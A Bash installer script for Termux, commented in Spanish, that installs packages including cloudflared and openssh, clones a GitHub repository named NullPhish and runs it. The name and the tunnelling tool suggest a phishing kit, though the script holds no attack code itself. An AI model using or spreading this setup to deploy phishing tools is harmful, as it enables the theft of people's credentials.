#!/bin/bash

# Comprobación rápida de si está en Termux
if [ -z "$PREFIX" ]; then
  echo "[-] Este script está diseñado para ejecutarse en Termux."
  exit 1
fi

# Arte ASCII
clear
echo -e "\e[1;31m"
cat << "EOF"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣀⣠⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠟⠛⠉⠉⠉⠉⠉⠉⠛⠿⣝⡢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢞⡿⠋⢀⡴⢋⡀⠀⠀⠀⠀⠀⠀⠀⡈⠙⢮⣷⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢣⡟⠁⠀⠛⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠉⠙⠛⠛⠿⣶⣄⠀⠀⠀⢀⣀⡤⡤⢄⣀⠀⠀⠀⠀
⠀⣀⣠⣠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠀⠀⠀⢀⣤⣤⣄⠀⠀⠀⢀⣤⣤⡀⠀⠀⠘⣶⣶⠾⠷⠶⠾⡿⠀⠀⡴⣻⠾⠋⠉⠻⣯⡳⡄⠀⠀
⢰⣿⠋⠙⠻⣝⢦⡀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⠀⣾⣿⣿⣿⡆⠀⢀⣾⣿⣿⣿⡆⠀⠀⢹⣿⠀⠀⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠈⢷⣱⡀⠀
⢸⣿⠀⠀⠀⠈⠳⣿⣦⡀⠀⠀⠀⠀⣿⡿⠀⠀⠀⠀⣿⣿⣿⣿⣷⠀⢸⣿⣿⣿⣿⣷⡀⠀⢸⣾⡄⠀⠀⠀⢀⣾⡟⠁⠀⠀⠀⢀⡀⠀⠈⣿⣧⠀
⠸⣿⡀⠀⠀⢠⠀⠈⠻⣿⣦⡀⠀⢸⣿⠇⠀⠀⢀⠀⢿⣿⣿⣿⡇⠀⠘⣿⣿⣿⣿⠇⢷⠀⠈⣿⢷⠀⠀⢀⣾⡿⠁⠀⠀⡖⠀⣾⠁⠀⠀⢹⣿⡀
⠀⢿⣧⠀⠀⠀⢧⠀⠀⠈⠳⣽⣶⣾⡟⠀⠀⢠⠏⡀⠈⠛⠛⠋⠀⠀⠀⠈⠻⠟⠋⠀⠘⣇⠀⠘⢯⣝⣶⣾⡿⠁⠀⠀⢸⠃⠀⡇⠀⠀⠀⠸⣿⡇
⠀⠈⢿⣇⠀⠀⠘⣇⠀⠀⠀⠀⠉⠉⠀⠀⣰⢏⡼⠁⠀⠀⠀⠀⢰⣿⣷⠀⠀⠀⠀⠀⠰⣌⠧⠀⠀⠈⠉⠁⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⣿⡇
⠀⠀⢸⣿⠀⠀⠀⢻⢀⡀⠀⠀⠀⠀⠀⠈⠁⠈⠀⠀⠀⠀⠀⠀⠘⠿⠟⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣴⡶⣶⢶⣤⣀⠀⣿⡇
⠀⠀⢸⡿⠀⠀⠀⠘⡇⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠀⢻⣷⣿⣿⣿⣿⠁
⠀⢠⣿⠇⠀⠀⠀⠀⠣⢸⡀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢶⣄⣸⣿⣏⣿⣿⠿⠁
⠀⣼⡟⠀⠀⣀⣀⣀⡀⠀⣇⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡜⡇⠀⠀⠀
⠀⡏⣣⣴⣿⡿⢻⡏⠛⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣼⡄⠀⠀
⠀⠹⣟⣿⢿⣿⣾⠀⠀⣠⣿⠂⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⡼⠀⠀⠀⢠⠇⠀⠀⠀⠀⢀⣴⡟⡼⠁⠀⠀
⠀⠀⠈⠉⣹⢻⣷⡶⠟⠋⠁⠀⡀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⣸⣤⣶⣶⣶⣾⣛⡵⠚⠁⠀⠀⠀
⠀⠀⠀⠀⡻⣿⡁⠀⠀⠀⠀⢸⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠉⠁⠀⠀⣰⠃⠀⠀⠀⢸⠇⠀⠀⠀⣿⠏⠀⢾⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠛⠿⢿⣿⣿⣶⣶⣾⡇⠀⠀⠀⡇⠀⠀⠀⠀⢆⠀⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⠀⠀⠀⣸⠀⠀⠀⠀⢿⣆⡀⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣤⣿⠃⠀⠀⠀⡇⠀⠀⡄⠀⠈⠳⣄⠀⠀⠀⠀⣠⠞⠁⠀⢠⠃⠀⠀⣿⠀⠀⠀⠀⠀⠉⠛⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣷⣿⠋⠁⠀⠀⠀⢸⡇⠀⠀⠸⡄⠀⠀⠈⠙⠒⠒⠋⠁⠀⠀⠀⡞⠀⠀⠀⣿⠀⠀⠀⠀⠀⣀⣠⣼⢿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢯⣟⡷⢶⣤⣤⣀⢸⡇⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⣿⠾⠛⢻⣿⠿⠭⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢳⣿⠙⣿⠃⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⠻⢷⣤⣼⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡾⠛⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠙⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣟⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⡃⣀⣀⠀⠀⠀⠀⣠⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⠦⣤⣤⠤⠤⣤⣿⣄⡀⠀⠀⠀⠀⠀⠀⢼⡟⠛⣿⣿⠿⠶⠾⠿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠛⢿⡿⣷⡀⠀⠀⠀⠀⠈⠻⣾⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣾⣷⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⡟⠀⠀⠀⠀⠀⣠⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⡇⠀⠀⠀⢀⡾⢻⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣏⣧⠀⠀⠀⣾⣱⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢮⣷⣄⣸⣷⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
EOF
echo -e "\e[0m"
echo -e "\e[1;32m[+] Iniciando Instalación...\e[0m"
sleep 2

install_pkg() {
  echo -e "\e[1;34m[*] Instalando: $1\e[0m"
  pkg install -y "$1" >/dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo -e "\e[1;32m[+] $1 instalado correctamente.\e[0m"
  else
    echo -e "\e[1;31m[-] Error al instalar $1\e[0m"
  fi
  sleep 1
}

echo -e "\e[1;34m[*] Actualizando repositorios y paquetes...\e[0m"
pkg update -y && pkg upgrade -y
sleep 1

install_pkg python
install_pkg python3
install_pkg git
install_pkg wget
install_pkg curl
install_pkg proot
install_pkg tar
install_pkg zip
install_pkg unzip
install_pkg openssh
install_pkg clang
install_pkg make
install_pkg cmake
install_pkg git-lfs
install_pkg cloudflared
install_pkg termux-api

echo -e "\e[1;34m[*] Actualizando pip...\e[0m"
pip install --upgrade pip
sleep 1

echo -e "\e[1;34m[*] Configurando Git LFS...\e[0m"
git lfs install
sleep 1

echo -e "\e[1;34m[*] Clonando repositorio NullPhish...\e[0m"
git clone https://github.com/DozerMx/NullPhish.git
sleep 1

cd NullPhish || { echo -e "\e[1;31m[-] Error: No se pudo acceder al directorio NullPhish.\e[0m"; exit 1; }

echo -e "\e[1;34m[*] Asignando permisos a cloudflared...\e[0m"
chmod +x cloudflared

echo -e "\e[1;34m[*] Solicitando permisos de almacenamiento...\e[0m"
termux-setup-storage
sleep 2

echo -e "\e[1;32m[+] Todo listo. Ejecutando NullPhish...\e[0m"
python3 NullPhish.py